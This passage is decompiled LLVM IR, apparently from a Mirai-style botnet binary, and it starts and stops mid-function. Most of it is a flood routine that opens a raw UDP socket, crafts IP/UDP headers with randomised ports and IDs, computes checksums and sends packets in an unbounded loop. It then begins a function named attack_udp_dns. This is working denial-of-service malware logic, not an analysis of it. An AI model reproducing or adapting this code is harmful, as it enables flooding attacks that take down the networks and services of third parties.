  %v3_be90 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_be94 = icmp eq i32 %v3_be90, -1
  store i1 %v7_be94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be90, i32* @sb, align 4
  br i1 %v7_be94, label %dec_label_pc_c1bc, label %dec_label_pc_bea0

dec_label_pc_bea0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bea8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bea8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bebc = call i32 @__GI_setsockopt(i32 %v3_be90, i32 0, i32 3, i32 %v6_bea8, i32 ptrtoint (i32* @0 to i32))
  %v7_bec0 = icmp eq i32 %v5_bebc, -1
  store i1 %v7_bec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bec0, label %dec_label_pc_c1b4, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bea0
  %v0_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = mul i32 %v0_bec8, 65536
  store i32 %v3_bec8, i32* @lr, align 4
  %v0_becc = load i32, i32* @r7, align 4
  %v0_bed0 = load i32, i32* @r6, align 4
  %v3_bed0 = mul i32 %v0_bed0, 65536
  store i32 %v3_bed0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_bed8 = urem i32 %v0_becc, 65536
  %v3_bedc = urem i32 %v0_bed0, 65536
  store i32 %v3_bedc, i32* %r2.global-to-local, align 4
  %v3_bee0 = urem i32 %v0_bec8, 65536
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v0_bee4 = load i32, i32* @r8, align 4
  %v2_bee4 = icmp eq i32 %v0_bee4, 0
  store i1 %v2_bee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bee4, label %dec_label_pc_c020.preheader, label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bec8
  %tmp33 = mul i32 %v0_becc, 256
  %v3_bf0c = and i32 %tmp33, 65280
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_bed0, 256
  %v3_bf10 = and i32 %tmp34, 65280
  store i32 %v3_bf10, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_bec8, 256
  %v3_bf14 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_becc, 256
  %v4_bf18 = urem i32 %tmp36, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf0c
  store i32 %v5_bf18, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_bed0, 256
  %v4_bf1c = urem i32 %tmp37, 256
  %v5_bf1c = or i32 %v4_bf1c, %v3_bf10
  store i32 %v5_bf1c, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_bec8, 256
  %v4_bf20 = urem i32 %tmp38, 256
  %v5_bf20 = or i32 %v4_bf20, %v3_bf14
  store i32 %v5_bf20, i32* @r7, align 4
  %v1_bfa8 = trunc i32 %v5_be24 to i8
  br label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %.thread, %dec_label_pc_befc
  %v2_bf2c = call i32 @calloc(i32 128, i32 1)
  %v3_bf30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf30, i32* %r2.global-to-local, align 4
  %v5_bf38 = mul i32 %v3_bf30, 24
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = load i32, i32* @fp, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v5_bf3c = mul i32 %v2_bf3c, 4
  %v6_bf3c = add i32 %v5_bf3c, %v1_bf3c
  %v7_bf3c = inttoptr i32 %v6_bf3c to i32*
  store i32 %v2_bf2c, i32* %v7_bf3c, align 4
  %v0_bf40 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf40 = load i32, i32* @sl, align 4
  %v2_bf40 = add i32 %v1_bf40, %v0_bf40
  store i32 %v2_bf40, i32* %r3.global-to-local, align 4
  %v0_bf44 = load i32, i32* @fp, align 4
  %v1_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf44, 4
  %v5_bf44 = add i32 %v4_bf44, %v0_bf44
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @lr, align 4
  %v1_bf4c = inttoptr i32 %v7_bf44 to i8*
  %v2_bf4c = load i8, i8* %v1_bf4c, align 1
  %tmp = urem i8 %v2_bf4c, 16
  %v1_bf50 = zext i8 %tmp to i32
  %v1_bf54 = or i32 %v1_bf50, 64
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf5c = trunc i32 %v1_bf54 to i8
  store i8 %v1_bf5c, i8* %v1_bf4c, align 1
  %v0_bf60 = load i32, i32* @lr, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_24f40.59, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v3_c060 = icmp eq i32 %v3_bed8, 65535
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v3_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ 65535, %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v4_c14c = mul i32 %v1_c144, 256
  %v4_c150 = mul i32 %v0_c134, 16777216
  %v5_c14c = or i32 %v4_c14c, %v4_c150
  %v5_c150 = or i32 %v5_c14c, %v5_c13c
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 0, 2, 1, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i1 %v3_c060, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v5_c228 = sdiv i32 %sext22, 16777216
  %v6_c228 = inttoptr i32 %v0_c220 to i32*
  %v7_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v6_c228, i32 3, i32 65535, i32 %v5_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
